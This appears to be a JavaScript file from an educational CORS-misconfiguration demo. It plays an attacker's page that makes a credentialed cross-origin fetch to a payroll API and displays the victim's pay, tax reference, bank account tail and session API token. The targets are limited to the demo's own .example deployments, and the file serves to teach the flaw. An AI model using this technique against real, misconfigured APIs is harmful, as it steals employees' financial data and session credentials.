// The attacker's page. Educational material; never deploy this.
//
// The interesting thing about this file is how boring it is. There is no exploit here —
// no injection, no parser trick, no stolen credential. It is the same `fetch` the payroll
// provider's own front-end makes, written by someone else, on a domain that has nothing
// to do with payroll.
//
// Against a correctly configured API it obtains nothing at all. Against one that answers
// the browser's cross-origin question with "whatever origin asked", it obtains the
// victim's pay, their bank account tail, and their session API token.

// Fixed targets. The page can be pointed at either of the demo's own two API deployments
// and at nothing else — a page that fetched an arbitrary URL from its query string would
// be a different, and worse, thing to publish.
const API_ORIGINS = {
  vulnerable: "https://legacy-api.meridianpay.example",
  secure: "https://api.meridianpay.example",
};

const requested = new URLSearchParams(location.search).get("api");
const target = requested === "secure" ? "secure" : "vulnerable";
const API_ORIGIN = API_ORIGINS[target];

const targetEl = document.getElementById("target");
const statusEl = document.getElementById("status");
const detailEl = document.getElementById("detail");
const lootPanel = document.getElementById("loot-panel");
const lootEl = document.getElementById("loot");

document.body.dataset.api = target;
targetEl.textContent = `${API_ORIGIN} (${target} deployment)`;

function money(minorUnits, currency) {
  return new Intl.NumberFormat("en-GB", { style: "currency", currency }).format(
    minorUnits / 100,
  );
}

function renderLoot(data) {
  lootEl.replaceChildren();
  const rows = [
    ["Employee", `${data.display_name} (${data.employee_id})`],
    ["Period", data.payslip.period],
    ["Net pay", money(data.payslip.net_pay_minor, data.payslip.currency)],
    ["Tax reference", data.payslip.tax_reference],
    ["Payout account tail", data.payout_account.account_tail],
    ["Session API token", data.api_token],
  ];
  for (const [label, value] of rows) {
    const dt = document.createElement("dt");
    dt.textContent = label;
    const dd = document.createElement("dd");
    dd.textContent = value;
    lootEl.append(dt, dd);
  }
  lootPanel.hidden = false;
}

async function attempt() {
  try {
    const response = await fetch(`${API_ORIGIN}/me/payslip`, {
      method: "GET",
      credentials: "include",
    });

    // Reaching this line means the browser released the response to this origin.
    const data = await response.json();
    document.body.dataset.outcome = "released";
    statusEl.textContent = `The browser released the response to this origin (HTTP ${response.status}). The victim's payroll data is now on an attacker's page.`;
    detailEl.textContent = "";
    renderLoot(data);
  } catch (error) {
    document.body.dataset.outcome = "blocked";
    statusEl.textContent =
      "The browser refused to give this page the response. Nothing was obtained.";
    detailEl.textContent = `${error.name}: ${error.message}`;
    lootPanel.hidden = true;
  }
}

attempt();
